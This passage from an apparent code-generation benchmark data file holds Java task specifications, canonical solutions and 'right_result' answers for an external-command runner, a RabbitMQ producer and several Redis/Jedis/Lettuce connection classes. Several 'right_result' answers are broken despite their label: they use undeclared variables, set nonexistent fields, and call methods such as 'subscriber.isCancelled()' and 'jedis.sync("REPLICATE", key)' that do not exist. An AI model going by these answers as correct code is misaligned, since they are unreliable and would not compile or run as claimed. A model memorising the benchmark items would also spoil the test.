    "right_result": "```java\nimport java.io.*;\nimport java.nio.file.*;\nimport java.util.*;\n\npublic class ExtCmd {\n    private Map<ExtCmdCondition, String> conditionsWithDescriptions;\n    private Set<ExtCmdEndedListener> extCmdEndedListenerSet;\n    private OutputReceiver outReceiver;\n    private OutputReceiver errReceiver;\n    private ErrorReporter errLog;\n    private long startTime;\n    private String[] execCommand;\n    private String execCommandStr;\n    private boolean logExecution;\n\n    public ExtCmd() {\n        this.conditionsWithDescriptions = new HashMap<>();\n        this.extCmdEndedListenerSet = new HashSet<>();\n        this.outReceiver = new OutputReceiver();\n        this.errReceiver = new OutputReceiver();\n        this.errLog = new ErrorReporter();\n        this.logExecution = true;\n    }\n\n    public OutputStream exec(ProcessBuilder.Redirect redirectInput, File workingDir, String... command) throws IOException {\n        checkForConditions();\n        this.execCommand = command;\n        this.execCommandStr = String.join(\" \", command);\n        ProcessBuilder processBuilder = new ProcessBuilder(command);\n        if (workingDir != null) {\n            processBuilder.directory(workingDir);\n        }\n        processBuilder.redirectInput(redirectInput);\n        processBuilder.redirectErrorStream(false);\n        Process process = processBuilder.start();\n\n        startTime = System.currentTimeMillis();\n\n        Thread outThread = new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    outReceiver.addLine(line);\n                }\n            } catch (IOException e) {\n                errLog.reportError(\"Error reading stdout: \" + e.getMessage());\n            }\n        });\n        outThread.start();\n\n        Thread errThread = new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    errReceiver.addLine(line);\n                }\n            } catch (IOException e) {\n                errLog.reportError(\"Error reading stderr: \" + e.getMessage());\n            }\n        });\n        errThread.start();\n\n        return process.getOutputStream();\n    }\n\n    public OutputData syncProcess() {\n        OutputData outputData = new OutputData();\n        try {\n            int exitCode = 0;\n            synchronized (this) {\n                while (true) {\n                    try {\n                        exitCode = process.waitFor();\n                        break;\n                    } catch (InterruptedException e) {\n                        Thread.currentThread().interrupt();\n                    }\n                }\n            }\n            outputData.stdout = String.join(\"\\n\", outReceiver.getLines());\n            outputData.stderr = String.join(\"\\n\", errReceiver.getLines());\n            outputData.exitCode = exitCode;\n\n            for (ExtCmdEndedListener listener : extCmdEndedListenerSet) {\n                listener.onCommandEnd(outputData);\n            }\n\n            if (logExecution) {\n                errLog.reportInfo(\"Command executed: \" + execCommandStr + \" (Exit code: \" + exitCode + \")\");\n            }\n        } catch (Exception e) {\n            errLog.reportError(\"Failed to execute command: \" + e.getMessage());\n        }\n        return outputData;\n    }\n\n    private void checkForConditions() {\n        for (Map.Entry<ExtCmdCondition, String> entry : conditionsWithDescriptions.entrySet()) {\n            if (!entry.getKey().check()) {\n                throw new IllegalStateException(entry.getValue());\n            }\n        }\n    }\n\n    public void addExtCmdEndedListener(ExtCmdEndedListener listener) {\n        extCmdEndedListenerSet.add(listener);\n    }\n\n    public void removeExtCmdEndedListener(ExtCmdEndedListener listener) {\n        extCmdEndedListenerSet.remove(listener);\n    }\n\n    public void setLogExecution(boolean logExecution) {\n        this.logExecution = logExecution;\n    }\n\n    public static class OutputData {\n        public List<String> stdoutLines = new ArrayList<>();\n        public List<String> stderrLines = new ArrayList<>();\n        public int exitCode;\n\n        @Override\n        public String toString() {\n            return \"OutputData{\" +\n                   \"stdout='\" + String.join(\"\\n\", stdoutLines) + '\\'' +\n                   \", stderr='\" + String.join(\"\\n\", stderrLines) + '\\'' +\n                   \", exitCode=\" + exitCode +\n                   '}';\n        }\n    }\n\n    public interface ExtCmdCondition {\n        boolean check();\n    }\n\n    public interface ExtCmdEndedListener {\n        void onCommandEnd(OutputData data);\n    }\n\n    private static class OutputReceiver {\n        private final List<String> lines = new ArrayList<>();\n\n        public void addLine(String line) {\n            lines.add(line);\n        }\n\n        public List<String> getLines() {\n            return Collections.unmodifiableList(lines);\n        }\n    }\n\n    private static class ErrorReporter {\n        public void reportError(String message) {\n            System.err.println(\"[ERROR] \" + message);\n        }\n\n        public void reportInfo(String message) {\n            System.out.println(\"[INFO] \" + message);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 306,
    "Instruction": "Task Description: Implement a RabbitMQ producer class in Java that can connect to a RabbitMQ broker, send messages to a specified queue, and properly manage resources.\n\nClass Description: The RabbitMQProducer class provides functionality to establish a connection with a RabbitMQ message broker, declare a queue, send messages to that queue, and handle connection cleanup. It supports both single message and batch message sending operations.\n\nAttributes:\n- host: String - The hostname or IP address of the RabbitMQ server\n- port: int - The port number of the RabbitMQ server\n- username: String - The username for authentication with RabbitMQ\n- password: String - The password for authentication with RabbitMQ\n- queueName: String - The name of the queue to send messages to\n- durable: boolean - Whether the queue should survive server restarts\n- connection: Connection - The RabbitMQ connection object\n- channel: Channel - The RabbitMQ channel object for message operations\n\nMethods:\n- RabbitMQProducer(Map<String, String> config) -> void - Constructor that initializes the producer with configuration parameters\n- connect() -> void - Establishes connection to RabbitMQ and creates a channel\n- sendMessage(String message) -> void - Sends a single message to the declared queue\n- sendMessages(String[] messages) -> void - Sends multiple messages to the declared queue\n- close() -> void - Closes the channel and connection to release resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.util.Map;\nimport java.util.concurrent.TimeoutException;\nimport com.rabbitmq.client.ConnectionFactory;\nimport com.rabbitmq.client.Connection;\nimport com.rabbitmq.client.Channel;\nimport com.rabbitmq.client.MessageProperties;\n\npublic class RabbitMQProducer {\n\n    private String host;\n    private int port;\n    private String username;\n    private String password;\n    private String queueName;\n    private boolean durable;\n    private Connection connection;\n    private Channel channel;\n\n    public RabbitMQProducer(Map<String, String> config) {\n        this.host = config.get(\"rabbitmq_host\");\n        this.port = Integer.parseInt(config.get(\"rabbitmq_port\"));\n        this.username = config.get(\"rabbitmq_user\");\n        this.password = config.get(\"rabbitmq_pass\");\n        this.queueName = config.get(\"rabbitmq_queuename\");\n        this.durable = config.get(\"rabbitmq_durable\").equals(\"true\");\n    }\n\n    public void connect() throws IOException, TimeoutException {\n        ConnectionFactory factory = new ConnectionFactory();\n        factory.setHost(host);\n        factory.setPort(port);\n        factory.setUsername(username);\n        factory.setPassword(password);\n        connection = factory.newConnection();\n        channel = connection.createChannel();\n        channel.queueDeclare(queueName, durable, false, false, null);\n    }\n\n    public void sendMessage(String message) throws IOException {\n        channel.basicPublish(\"\", queueName, \n            MessageProperties.PERSISTENT_TEXT_PLAIN,\n            message.getBytes()\n        );\n    }\n\n    public void sendMessages(String[] messages) throws IOException {\n        for (String message : messages) {\n            sendMessage(message);\n        }\n    }\n\n    public void close() throws IOException, TimeoutException {\n        if (channel != null && channel.isOpen()) {\n            channel.close();\n        }\n        if (connection != null && connection.isOpen()) {\n            connection.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 40,
    "right_result": "```java\nimport com.rabbitmq.client.*;\nimport java.io.IOException;\nimport java.util.Map;\nimport java.util.concurrent.TimeoutException;\n\npublic class RabbitMQProducer {\n    private String host;\n    private int port;\n    private String username;\n    private String password;\n    private String queueName;\n    private boolean durable;\n    private Connection connection;\n    private Channel channel;\n\n    public RabbitMQProducer(Map<String, String> config) {\n        this.host = config.get(\"host\");\n        this.port = Integer.parseInt(config.get(\"port\"));\n        this.username = config.get(\"username\");\n        this.password = config.get(\"password\");\n        this.queueName = config.get(\"queueName\");\n        this.durable = Boolean.parseBoolean(config.get(\"durable\"));\n    }\n\n    public void connect() throws IOException, TimeoutException {\n        ConnectionFactory factory = new ConnectionFactory();\n        factory.setHost(host);\n        factory.setPort(port);\n        factory.setUsername(username);\n        factory.setPassword(password);\n        connection = factory.newConnection();\n        channel = connection.createChannel();\n        channel.queueDeclare(queueName, durable, false, false, null);\n    }\n\n    public void sendMessage(String message) throws IOException {\n        channel.basicPublish(\"\", queueName, null, message.getBytes());\n    }\n\n    public void sendMessages(String[] messages) throws IOException {\n        for (String message : messages) {\n            channel.basicPublish(\"\", queueName, null, message.getBytes());\n        }\n    }\n\n    public void close() throws IOException {\n        if (channel != null) {\n            channel.close();\n        }\n        if (connection != null) {\n            connection.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 307,
    "Instruction": "Task Description: Create a Java class that implements a Redis publisher using the Lettuce client library, capable of publishing elements to a Redis list and providing a reactive stream publisher for consuming these elements.\n\nClass Description: The RedisPublisher class provides functionality to connect to a Redis server, publish elements to a Redis list, and create a reactive stream publisher for these elements. It handles connection management and resource cleanup.\n\nAttributes:\n- client: [RedisClient] - The Redis client instance used to establish connections with the Redis server.\n- connection: [StatefulRedisConnection<String, String>] - The active connection to the Redis server for executing commands.\n\nMethods:\n- RedisPublisher() - [Constructor] -> [void] - Initializes the Redis client and establishes a connection to the Redis server. Also flushes all existing data in Redis.\n- createPublisher(long elements) -> [Publisher<String>] - Creates and returns a reactive stream Publisher that emits elements from a Redis list. The method creates a new Redis list with the specified number of elements and sets up a supplier for LRANGE commands to retrieve them.\n- close() -> [void] - Closes the Redis connection and shuts down the client to release resources.\n\nInput: \n- For createPublisher: elements [long] - The number of elements to publish to the Redis list.\n\nOutput:\n- For createPublisher: A Publisher<String> that emits the elements from the Redis list. Returns null if elements equals Long.MAX_VALUE.",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.codec.StringCodec;\nimport io.lettuce.core.output.ValueListOutput;\nimport io.lettuce.core.protocol.Command;\nimport io.lettuce.core.protocol.CommandArgs;\nimport io.lettuce.core.protocol.CommandType;\nimport io.lettuce.test.resource.FastShutdown;\nimport io.lettuce.test.resource.TestClientResources;\nimport io.lettuce.test.settings.TestSettings;\nimport org.reactivestreams.Publisher;\nimport java.util.List;\nimport java.util.UUID;\nimport java.util.function.Supplier;\n\npublic class RedisPublisher {\n\n    private RedisClient client;\n    private StatefulRedisConnection<String, String> connection;\n\n    public RedisPublisher() {\n        client = RedisClient.create(TestClientResources.get(), RedisURI.create(TestSettings.host(), TestSettings.port()));\n        connection = client.connect();\n        connection.sync().flushall();\n    }\n\n    public Publisher<String> createPublisher(long elements) {\n        RedisCommands<String, String> sync = connection.sync();\n\n        if (elements == Long.MAX_VALUE) {\n            return null;\n        }\n\n        String id = UUID.randomUUID().toString();\n        String key = \"PublisherVerification-\" + id;\n\n        for (int i = 0; i < elements; i++) {\n            sync.lpush(key, \"element-\" + i);\n        }\n\n        Supplier<Command<String, String, List<String>>> supplier = () -> {\n            CommandArgs<String, String> args = new CommandArgs<>(StringCodec.UTF8).addKey(key).add(0).add(-1);\n            return new Command<>(CommandType.LRANGE, new ValueListOutput<>(StringCodec.UTF8), args);\n        };\n\n        return new TestRedisPublisher(supplier, connection, true);\n    }\n\n    public void close() {\n        connection.close();\n        FastShutdown.shutdown(client);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.*;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport org.reactivestreams.Publisher;\n\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic class RedisPublisher {\n    private final RedisClient client;\n    private final StatefulRedisConnection<String, String> connection;\n\n    public RedisPublisher() {\n        this.client = RedisClient.create(\"redis://localhost:6379\");\n        this.connection = client.connect();\n        RedisCommands<String, String> syncCommands = connection.sync();\n        syncCommands.flushall();\n    }\n\n    public Publisher<String> createPublisher(long elements) {\n        if (elements == Long.MAX_VALUE) {\n            return null;\n        }\n\n        RedisCommands<String, String> syncCommands = connection.sync();\n        for (long i = 0; i < elements; i++) {\n            syncCommands.rpush(\"mylist\", \"element-\" + i);\n        }\n\n        CountDownLatch latch = new CountDownLatch(1);\n        AtomicLong index = new AtomicLong(0);\n\n        return subscriber -> {\n            new Thread(() -> {\n                try {\n                    while (!subscriber.isCancelled()) {\n                        long currentIndex = index.getAndIncrement();\n                        if (currentIndex >= elements) {\n                            subscriber.onComplete();\n                            break;\n                        }\n                        String element = syncCommands.lindex(\"mylist\", currentIndex);\n                        if (element != null) {\n                            subscriber.onNext(element);\n                        } else {\n                            subscriber.onError(new RuntimeException(\"Element not found at index \" + currentIndex));\n                        }\n                    }\n                } catch (Exception e) {\n                    subscriber.onError(e);\n                } finally {\n                    latch.countDown();\n                }\n            }).start();\n        };\n    }\n\n    public void close() {\n        connection.close();\n        client.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 309,
    "Instruction": "Task Description: Create a Java class that manages Redis connections using the Jedis client library, providing methods to establish, close, and create new connections with configurable protocols.\n\nClass Description: The RedisConnectionManager class handles Redis connection management using Jedis, allowing for protocol configuration and providing essential connection operations. It encapsulates connection details and offers methods for connection lifecycle management.\n\nAttributes:\n\nendpoint: [EndpointConfig] - Configuration for Redis connection endpoint (host, port, etc.)\nprotocol: [RedisProtocol] - The Redis protocol to be used for connections\njedis: [Jedis] - The Jedis client instance for Redis operations\n\nMethods:\n\nsetUpConnection: [void]() -> [void] - Establishes a new Redis connection with the configured protocol and timeout, and flushes all existing data\ncloseConnection: [void]() -> [void] - Closes the current Redis connection and releases resources\ncreateNewConnection: [Jedis]() -> [Jedis] - Creates and returns a new Jedis connection instance with the configured protocol",
    "Canonical_solution": "import redis.clients.jedis.Jedis;\nimport redis.clients.jedis.HostAndPorts;\nimport redis.clients.jedis.RedisProtocol;\nimport redis.clients.jedis.EndpointConfig;\n\npublic class RedisConnectionManager {\n\n    protected static final EndpointConfig endpoint = HostAndPorts.getRedisEndpoint(\"standalone0\");\n    protected final RedisProtocol protocol;\n    protected Jedis jedis;\n\n    public RedisConnectionManager(RedisProtocol protocol) {\n        this.protocol = protocol;\n    }\n\n    public void setUpConnection() throws Exception {\n        jedis = new Jedis(endpoint.getHostAndPort(), endpoint.getClientConfigBuilder()\n            .protocol(protocol).timeoutMillis(500).build());\n        jedis.flushAll();\n    }\n\n    public void closeConnection() throws Exception {\n        jedis.close();\n    }\n\n    public Jedis createNewConnection() {\n        return new Jedis(endpoint.getHostAndPort(), endpoint.getClientConfigBuilder()\n            .protocol(protocol).build());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.Protocol;\n\npublic class RedisConnectionManager {\n    private EndpointConfig endpoint;\n    private Protocol protocol;\n    private Jedis jedis;\n\n    public RedisConnectionManager(EndpointConfig endpoint, Protocol protocol) {\n        this.endpoint = endpoint;\n        this.protocol = protocol;\n    }\n\n    public void setUpConnection() {\n        if (jedis != null) {\n            closeConnection();\n        }\n        jedis = new Jedis(endpoint.getHost(), endpoint.getPort(), protocol.timeout);\n        jedis.flushAll();\n    }\n\n    public void closeConnection() {\n        if (jedis != null) {\n            jedis.close();\n            jedis = null;\n        }\n    }\n\n    public Jedis createNewConnection() {\n        return new Jedis(endpoint.getHost(), endpoint.getPort(), protocol.timeout);\n    }\n}\n```"
  },
  {
    "Task_id": 311,
    "Instruction": "Task Description: Create a Java class that manages Redis connections using the Jedis client library, providing functionality for connection establishment, credential updates, and resource cleanup.\n\nClass Description: The RedisConnectionManager class encapsulates Redis connection management using JedisPooled for connection pooling. It handles authentication, provides access to the Jedis instance, allows credential updates, and ensures proper resource cleanup.\n\nAttributes:\n- jedis: JedisPooled - The pooled Redis connection instance\n- credentialsProvider: DefaultRedisCredentialsProvider - Provider for Redis authentication credentials\n\nMethods:\n- RedisConnectionManager(String host, int port, String initialUsername, String initialPassword) -> void - Constructor that initializes the Redis connection with host, port, and initial credentials\n- updateCredentials(String updatedUsername, String updatedPassword) -> void - Updates the authentication credentials for the Redis connection\n- getJedisInstance() -> JedisPooled - Returns the managed JedisPooled instance for Redis operations\n- closeConnection() -> void - Closes the Redis connection and releases resources",
    "Canonical_solution": "import redis.clients.jedis.DefaultJedisClientConfig;\nimport redis.clients.jedis.DefaultRedisCredentials;\nimport redis.clients.jedis.DefaultRedisCredentialsProvider;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisPooled;\n\npublic class RedisConnectionManager {\n\n    private JedisPooled jedis;\n    private DefaultRedisCredentialsProvider credentialsProvider;\n\n    public RedisConnectionManager(String host, int port, String initialUsername, String initialPassword) {\n        DefaultRedisCredentials initialCredentials = new DefaultRedisCredentials(initialUsername, initialPassword);\n        this.credentialsProvider = new DefaultRedisCredentialsProvider(initialCredentials);\n        HostAndPort address = new HostAndPort(host, port);\n        DefaultJedisClientConfig clientConfig = DefaultJedisClientConfig.builder()\n                .credentialsProvider(credentialsProvider).build();\n        this.jedis = new JedisPooled(address, clientConfig);\n    }\n\n    public void updateCredentials(String updatedUsername, String updatedPassword) {\n        DefaultRedisCredentials updatedCredentials = new DefaultRedisCredentials(updatedUsername, updatedPassword);\n        credentialsProvider.setCredentials(updatedCredentials);\n    }\n\n    public JedisPooled getJedisInstance() {\n        return jedis;\n    }\n\n    public void closeConnection() {\n        jedis.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.JedisPooled;\nimport redis.clients.jedis.util.Pool;\n\npublic class RedisConnectionManager {\n    private JedisPooled jedis;\n    private DefaultRedisCredentialsProvider credentialsProvider;\n\n    public RedisConnectionManager(String host, int port, String initialUsername, String initialPassword) {\n        this.credentialsProvider = new DefaultRedisCredentialsProvider(initialUsername, initialPassword);\n        this.jedis = new JedisPooled(host, port, 2000, \"default\", initialUsername, initialPassword);\n    }\n\n    public void updateCredentials(String updatedUsername, String updatedPassword) {\n        credentialsProvider.updateCredentials(updatedUsername, updatedPassword);\n        if (jedis != null) {\n            jedis.disconnect();\n            jedis = new JedisPooled(\n                ((JedisPooled) jedis).getHost(),\n                ((JedisPooled) jedis).getPort(),\n                2000,\n                \"default\",\n                updatedUsername,\n                updatedPassword\n            );\n        }\n    }\n\n    public JedisPooled getJedisInstance() {\n        return jedis;\n    }\n\n    public void closeConnection() {\n        if (jedis != null) {\n            jedis.close();\n        }\n    }\n}\n\nclass DefaultRedisCredentialsProvider {\n    private String username;\n    private String password;\n\n    public DefaultRedisCredentialsProvider(String username, String password) {\n        this.username = username;\n        this.password = password;\n    }\n\n    public void updateCredentials(String newUsername, String newPassword) {\n        this.username = newUsername;\n        this.password = newPassword;\n    }\n\n    public String getUsername() {\n        return username;\n    }\n\n    public String getPassword() {\n        return password;\n    }\n}\n```"
  },
  {
    "Task_id": 312,
    "Instruction": "Task Description: Implement a Redis-based registry class for node registration and subscription in a distributed system, using Java with Jedis client library.\n\nClass Description: RedisRegistry is a class that provides node registration and subscription capabilities using Redis as the backend storage. It maintains connections to Redis servers, handles node registration, and manages subscription to node changes.\n\nAttributes:\n- jedisPools: ConcurrentHashMap<String, JedisPool> - A thread-safe map storing JedisPool instances for different Redis server addresses\n- clusterName: String - The name of the current cluster\n- replicate: boolean - Flag indicating whether operations should be replicated to all Redis servers\n- notifiers: ConcurrentMap<String, Notifier> - A thread-safe map storing Notifier instances for different node paths\n\nMethods:\n- RedisRegistry(AppContext appContext) - Constructor - Initializes the registry with configuration from AppContext\n  Input: appContext: AppContext - The application context containing configuration\n  Output: None\n\n- doRegister(Node node) - protected - Registers a node in Redis\n  Input: node: Node - The node to be registered\n  Output: None (throws NodeRegistryException on failure)\n\n- doSubscribe(Node node, NotifyListener listener) - protected - Subscribes to node changes\n  Input: \n    node: Node - The node that wants to subscribe\n    listener: NotifyListener - The listener to be notified of changes\n  Output: None\n\nNested Classes:\n- NotifySub extends JedisPubSub - Handles Redis pub/sub messages\n  Methods:\n    onMessage(String key, String msg) - Processes incoming messages\n      Input:\n        key: String - The channel/key of the message\n        msg: String - The message content\n      Output: None\n\n- Notifier extends Thread - Manages subscription thread\n  Methods:\n    run() - Main thread execution for subscription\n      Input: None\n      Output: None\n    shutdown() - Stops the subscription thread\n      Input: None\n      Output: None",
    "Canonical_solution": "import com.github.ltsopensource.core.AppContext;\nimport com.github.ltsopensource.core.cluster.Config;\nimport com.github.ltsopensource.core.cluster.Node;\nimport com.github.ltsopensource.core.cluster.NodeType;\nimport com.github.ltsopensource.core.commons.utils.CollectionUtils;\nimport com.github.ltsopensource.core.constant.Constants;\nimport com.github.ltsopensource.core.exception.NodeRegistryException;\nimport com.github.ltsopensource.core.logger.Logger;\nimport com.github.ltsopensource.core.logger.LoggerFactory;\nimport com.github.ltsopensource.core.registry.NotifyEvent;\nimport com.github.ltsopensource.core.registry.NotifyListener;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPubSub;\nimport java.util.*;\nimport java.util.concurrent.*;\n\npublic class RedisRegistry {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(RedisRegistry.class);\n    private final Map<String, JedisPool> jedisPools = new ConcurrentHashMap<String, JedisPool>();\n    private String clusterName;\n    private boolean replicate;\n    private final ConcurrentMap<String, Notifier> notifiers = new ConcurrentHashMap<String, Notifier>();\n\n    public RedisRegistry(AppContext appContext) {\n        Config config = appContext.getConfig();\n        this.clusterName = config.getClusterName();\n\n        String address = NodeRegistryUtils.getRealRegistryAddress(config.getRegistryAddress());\n        String[] addrs = address.split(\",\");\n        for (String addr : addrs) {\n            int i = addr.indexOf(':');\n            String host = addr.substring(0, i);\n            int port = Integer.parseInt(addr.substring(i + 1));\n            this.jedisPools.put(addr, new JedisPool(new JedisPoolConfig(), host, port, Constants.DEFAULT_TIMEOUT));\n        }\n    }\n\n    protected void doRegister(Node node) {\n        String key = NodeRegistryUtils.getNodeTypePath(clusterName, node.getNodeType());\n        boolean success = false;\n        NodeRegistryException exception = null;\n        for (Map.Entry<String, JedisPool> entry : jedisPools.entrySet()) {\n            JedisPool jedisPool = entry.getValue();\n            try {\n                Jedis jedis = jedisPool.getResource();\n                try {\n                    jedis.hset(key, node.toFullString(), String.valueOf(SystemClock.now() + Constants.DEFAULT_SESSION_TIMEOUT));\n                    jedis.publish(key, Constants.REGISTER);\n                    success = true;\n                    if (!replicate) {\n                        break;\n                    }\n                } finally {\n                    jedis.close();\n                }\n            } catch (Throwable t) {\n                exception = new NodeRegistryException(\"Failed to register node to redis registry. registry: \" + entry.getKey() + \", node: \" + node + \", cause: \" + t.getMessage(), t);\n            }\n        }\n        if (exception != null && !success) {\n            throw exception;\n        }\n    }\n\n    protected void doSubscribe(Node node, NotifyListener listener) {\n        List<NodeType> listenNodeTypes = node.getListenNodeTypes();\n        if (CollectionUtils.isEmpty(listenNodeTypes)) {\n            return;\n        }\n        for (NodeType listenNodeType : listenNodeTypes) {\n            String listenNodePath = NodeRegistryUtils.getNodeTypePath(clusterName, listenNodeType);\n            Notifier notifier = notifiers.get(listenNodePath);\n            if (notifier == null) {\n                Notifier newNotifier = new Notifier(listenNodePath);\n                notifiers.putIfAbsent(listenNodePath, newNotifier);\n                notifier = notifiers.get(listenNodePath);\n                if (notifier == newNotifier) {\n                    notifier.start();\n                }\n            }\n        }\n    }\n\n    private class NotifySub extends JedisPubSub {\n        private final JedisPool jedisPool;\n\n        public NotifySub(JedisPool jedisPool) {\n            this.jedisPool = jedisPool;\n        }\n\n        @Override\n        public void onMessage(String key, String msg) {\n            if (msg.equals(Constants.REGISTER) || msg.equals(Constants.UNREGISTER)) {\n                try {\n                    Jedis jedis = jedisPool.getResource();\n                    try {\n                        doNotify(jedis, key);\n                    } finally {\n                        jedis.close();\n                    }\n                } catch (Throwable t) {\n                    LOGGER.error(t.getMessage(), t);\n                }\n            }\n        }\n    }\n\n    private class Notifier extends Thread {\n        private final String listenNodePath;\n        private volatile Jedis jedis;\n        private volatile boolean running = true;\n\n        public Notifier(String listenNodePath) {\n            super.setDaemon(true);\n            super.setName(\"LTSRedisSubscribe\");\n            this.listenNodePath = listenNodePath;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (running) {\n                    for (Map.Entry<String, JedisPool> entry : jedisPools.entrySet()) {\n                        try {\n                            JedisPool jedisPool = entry.getValue();\n                            jedis = jedisPool.getResource();\n                            try {\n                                jedis.subscribe(new NotifySub(jedisPool), listenNodePath);\n                                break;\n                            } finally {\n                                jedis.close();\n                            }\n                        } catch (Throwable t) {\n                            LOGGER.warn(\"Failed to subscribe node from redis registry. registry: \" + entry.getKey(), t);\n                        }\n                    }\n                }\n            } catch (Throwable t) {\n                LOGGER.error(t.getMessage(), t);\n            }\n        }\n\n        public void shutdown() {\n            try {\n                running = false;\n                jedis.disconnect();\n            } catch (Throwable t) {\n                LOGGER.warn(t.getMessage(), t);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPubSub;\nimport redis.clients.jedis.exceptions.JedisException;\n\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\n\npublic class RedisRegistry {\n    private final ConcurrentHashMap<String, JedisPool> jedisPools = new ConcurrentHashMap<>();\n    private final String clusterName;\n    private final boolean replicate;\n    private final ConcurrentMap<String, Notifier> notifiers = new ConcurrentHashMap<>();\n\n    public RedisRegistry(AppContext appContext) {\n        this.clusterName = appContext.getClusterName();\n        this.replicate = appContext.isReplicate();\n        initializeJedisPools(appContext.getRedisServers());\n    }\n\n    private void initializeJedisPools(String[] redisServers) {\n        for (String server : redisServers) {\n            if (!jedisPools.containsKey(server)) {\n                jedisPools.putIfAbsent(server, new JedisPool(server));\n            }\n        }\n    }\n\n    protected void doRegister(Node node) throws NodeRegistryException {\n        try (Jedis jedis = jedisPools.get(node.getServer()).getResource()) {\n            String key = \"node:\" + clusterName + \":\" + node.getPath();\n            jedis.set(key, node.serialize());\n            if (replicate) {\n                jedis.sync(\"REPLICATE\", key);\n            }\n        } catch (JedisException e) {\n            throw new NodeRegistryException(\"Failed to register node: \" + node, e);\n        }\n    }\n\n    protected void doSubscribe(Node node, NotifyListener listener) {\n        String channel = \"notify:\" + clusterName + \":\" + node.getPath();\n        NotifySub notifySub = new NotifySub(listener);\n        Notifier notifier = new Notifier(jedisPools.get(node.getServer()), channel, notifySub);\n        notifiers.put(channel, notifier);\n        notifier.start();\n    }\n\n    private static class NotifySub extends JedisPubSub {\n        private final NotifyListener listener;\n\n        public NotifySub(NotifyListener listener) {\n            this.listener = listener;\n        }\n\n        @Override\n        public void onMessage(String channel, String message) {\n            listener.onNodeChange(channel, message);\n        }\n    }\n\n    private class Notifier extends Thread {\n        private final JedisPool jedisPool;\n        private final String channel;\n        private final JedisPubSub jedisPubSub;\n        private volatile boolean running = true;\n\n        public Notifier(JedisPool jedisPool, String channel, JedisPubSub jedisPubSub) {\n            this.jedisPool = jedisPool;\n            this.channel = channel;\n            this.jedisPubSub = jedisPubSub;\n        }\n\n        @Override\n        public void run() {\n            try (Jedis jedis = jedisPool.getResource()) {\n                while (running) {\n                    jedis.subscribe(jedisPubSub, channel);\n                }\n            } catch (JedisException e) {\n                if (running) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        public void shutdown() {\n            running = false;\n            interrupt();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 313,
    "Instruction": "Task Description: Create a Redis connection manager class in Java using Lettuce client that handles connection setup, management, and cleanup.\n\nClass Description: RedisConnectionManager is a utility class that manages Redis connections using Lettuce client. It provides methods to establish a connection with configurable timeout options, retrieve the active connection, and properly close the connection when no longer needed.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance used to create connections\n- connection: StatefulRedisConnection<byte[], byte[]> - The active Redis connection using byte array codec\n\nMethods:\n- setupConnection(String host, int port) -> void - Initializes the Redis client and establishes a connection to the specified Redis server with a 10-second timeout configuration\n- closeConnection() -> void - Properly closes the active connection and shuts down the Redis client\n- getConnection() -> StatefulRedisConnection<byte[], byte[]> - Returns the active Redis connection instance",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.codec.ByteArrayCodec;\nimport io.lettuce.core.ClientOptions;\nimport io.lettuce.core.TimeoutOptions;\nimport java.time.Duration;\nimport java.util.concurrent.TimeUnit;\n\npublic class RedisConnectionManager {\n\n    private RedisClient redisClient;\n    private StatefulRedisConnection<byte[], byte[]> connection;\n\n    public void setupConnection(String host, int port) {\n        redisClient = RedisClient.create(RedisURI.create(host, port));\n        redisClient.setOptions(ClientOptions.builder()\n                .timeoutOptions(TimeoutOptions.builder().fixedTimeout(Duration.ofSeconds(10)).build()).build());\n        connection = redisClient.connect(ByteArrayCodec.INSTANCE);\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown(0, 0, TimeUnit.SECONDS);\n        }\n    }\n\n    public StatefulRedisConnection<byte[], byte[]> getConnection() {\n        return connection;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
